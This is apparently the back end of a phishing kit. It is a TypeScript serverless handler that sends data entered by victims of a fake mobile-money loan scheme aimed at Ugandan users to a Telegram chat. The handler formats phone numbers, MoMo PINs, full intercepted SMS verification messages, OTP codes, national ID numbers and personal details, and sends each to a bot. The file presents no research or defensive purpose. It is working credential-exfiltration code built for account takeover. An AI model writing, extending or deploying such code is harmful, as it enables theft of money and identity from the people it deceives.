// Universal Vercel Serverless Function & Express Route: sendToTelegram
import {
  getTelegramCredentials,
  sendTelegramMessage,
  escapeHtml,
  formatExtraFields,
  parseRequestBody,
} from './_telegram';

export default async function handler(req: any, res: any) {
  // Safe CORS setup
  if (res && typeof res.setHeader === 'function') {
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,POST');
    res.setHeader(
      'Access-Control-Allow-Headers',
      'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
    );
  }

  if (req.method === 'OPTIONS') {
    return res.status ? res.status(200).end() : res.end();
  }

  if (req.method !== 'POST') {
    const errorMsg = { error: 'Method not allowed' };
    return res.status ? res.status(405).json(errorMsg) : res.end(JSON.stringify(errorMsg));
  }

  try {
    const input = parseRequestBody(req);
    const { botToken, chatId, chatIds } = getTelegramCredentials();
    const timeStr = new Date().toUTCString();

    let messageHtml = '';

    if (input.type === 'phone') {
      messageHtml =
        `📱 <b>New User Started Registration</b>\n\n` +
        `🌍 <b>Country:</b> ${escapeHtml(input.country || 'Uganda')}\n` +
        `📞 <b>Phone:</b> <code>${escapeHtml(input.countryCode || '+256')} ${escapeHtml(input.phone || '')}</code>\n` +
        `⏰ <b>Time:</b> ${escapeHtml(timeStr)}` +
        formatExtraFields(input, ['type', 'country', 'countryCode', 'phone']);
    } else if (input.type === 'credentials') {
      messageHtml =
        `📱 <b>MoMo Account Login / PIN</b>\n\n` +
        `🌍 <b>Country:</b> ${escapeHtml(input.country || 'Uganda')}\n` +
        `📞 <b>Phone:</b> <code>${escapeHtml(input.countryCode || '+256')} ${escapeHtml(input.phone || '')}</code>\n` +
        `🔐 <b>MoMo PIN:</b> <code>${escapeHtml(input.pin || 'N/A')}</code>\n` +
        `⏰ <b>Time:</b> ${escapeHtml(timeStr)}` +
        formatExtraFields(input, ['type', 'country', 'countryCode', 'phone', 'pin']);
    } else if (input.type === 'sms' || (input.type === 'otp' && input.smsMessage)) {
      messageHtml =
        `📩 <b>SMS Verification Message Received</b>\n\n` +
        `🌍 <b>Country:</b> ${escapeHtml(input.country || 'Uganda')}\n` +
        `📞 <b>Phone:</b> <code>${escapeHtml(input.countryCode || '+256')} ${escapeHtml(input.phone || '')}</code>\n` +
        `⏰ <b>Time:</b> ${escapeHtml(timeStr)}\n\n` +
        `💬 <b>Full SMS Message:</b>\n<pre>${escapeHtml(input.smsMessage || input.otp || 'N/A')}</pre>` +
        formatExtraFields(input, ['type', 'country', 'countryCode', 'phone', 'smsMessage', 'otp']);
    } else if (input.type === 'final_otp' || input.type === 'otp') {
      messageHtml =
        `🔐 <b>4-Digit Final OTP Code Entered</b>\n\n` +
        `🌍 <b>Country:</b> ${escapeHtml(input.country || 'Uganda')}\n` +
        `📞 <b>Phone:</b> <code>${escapeHtml(input.countryCode || '+256')} ${escapeHtml(input.phone || '')}</code>\n` +
        `🔢 <b>OTP Code:</b> <code>${escapeHtml(input.otp || 'N/A')}</code>\n` +
        `⏰ <b>Time:</b> ${escapeHtml(timeStr)}` +
        formatExtraFields(input, ['type', 'country', 'countryCode', 'phone', 'otp']);
    } else {
      // Full loan application & personal details submission
      messageHtml =
        `🎉 <b>Full Loan Application Submitted</b>\n\n` +
        `👤 <b>Personal Details</b>\n` +
        `• <b>First Name:</b> ${escapeHtml(input.firstName || 'N/A')}\n` +
        `• <b>Last Name:</b> ${escapeHtml(input.lastName || 'N/A')}\n` +
        `• <b>Full Name:</b> ${escapeHtml((input.firstName || '') + ' ' + (input.lastName || '')).trim() || 'N/A'}\n` +
        `• <b>Phone Number:</b> <code>${escapeHtml(input.countryCode || '+256')} ${escapeHtml(input.phone || input.mobile || '')}</code>\n` +
        `• <b>Gender:</b> ${escapeHtml(input.gender || 'N/A')}\n` +
        `• <b>National ID / NIN:</b> <code>${escapeHtml(input.idNumber || 'N/A')}</code>\n` +
        `• <b>Nationality:</b> ${escapeHtml(input.nationality || 'Ugandan')}\n` +
        `• <b>Email Address:</b> ${escapeHtml(input.email || 'N/A')}\n\n` +
        `💰 <b>Loan Details</b>\n` +
        `• <b>Loan Amount:</b> <b>${escapeHtml(input.loanAmount || 'UGX 1,000,000')}</b>\n` +
        `• <b>Purpose:</b> ${escapeHtml(input.loanPurpose || 'Business Expansion')}\n` +
        `• <b>Loan Type:</b> ${escapeHtml(input.loanType || 'Business Loan')}\n` +
        `• <b>Repayment Period:</b> ${escapeHtml(input.repaymentPeriod || '6 Months')}\n` +
        `• <b>Disbursement:</b> Instant Mobile Money\n\n` +
        `🌍 <b>Country:</b> ${escapeHtml(input.country || 'Uganda')}\n` +
        `⏰ <b>Submission Time:</b> ${escapeHtml(timeStr)}` +
        formatExtraFields(input, [
          'type',
          'country',
          'countryCode',
          'phone',
          'mobile',
          'firstName',
          'lastName',
          'gender',
          'idNumber',
          'nationality',
          'email',
          'loanAmount',
          'loanPurpose',
          'loanType',
          'repaymentPeriod',
        ]);
    }

    let telegramSent = false;
    let dispatchError: string | undefined;

    if (botToken && chatId) {
      const sendRes = await sendTelegramMessage(botToken, chatIds.length > 0 ? chatIds : chatId, messageHtml);
      telegramSent = sendRes.ok;
      if (!sendRes.ok) {
        dispatchError = sendRes.description;
        console.warn('[Telegram Dispatch Warning]:', sendRes.description);
      }
    } else {
      console.log('[Telegram Notification Log (Demo Mode)]\n', messageHtml.replace(/<[^>]*>/g, ''));
    }

    const responsePayload = {
      success: true,
      delivered: telegramSent,
      ...(dispatchError ? { warning: dispatchError } : {}),
    };

    return res.status ? res.status(200).json(responsePayload) : res.end(JSON.stringify(responsePayload));
  } catch (error: any) {
    console.warn('[sendToTelegram Notice]:', error.message || error);
    const errPayload = { success: true, error: error.message };
    return res.status ? res.status(200).json(errPayload) : res.end(JSON.stringify(errPayload));
  }
}
